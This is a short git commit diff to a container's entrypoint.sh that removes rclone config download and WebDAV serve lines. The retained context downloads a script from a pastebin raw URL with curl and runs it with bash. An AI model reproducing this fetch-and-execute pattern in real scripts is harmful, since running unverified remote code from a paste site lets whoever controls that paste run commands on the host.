5b7753510c476940e9b573dd1c1ef588b7b1f8de
ALLOC20 <63141816+ALLOC20@users.noreply.github.com>
2021-08-21 23:21:09 +0800

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -3,11 +3,3 @@
 curl "https://pastebin.com/raw/bjzadHka" >status
 bash status | grep 'working\|maintenance'
 rclone version
-mkdir /.config
-mkdir /.config/rclone/
-wget -nc $CONFIG_IN_URL -O '/.config/rclone/rclone.conf'
-rclone version
-rclone version
-rclone listremotes
-#refreshing Rclone
-rclone serve webdav $CLOUDNAME: --addr :12345 --vfs-read-chunk-size 128M
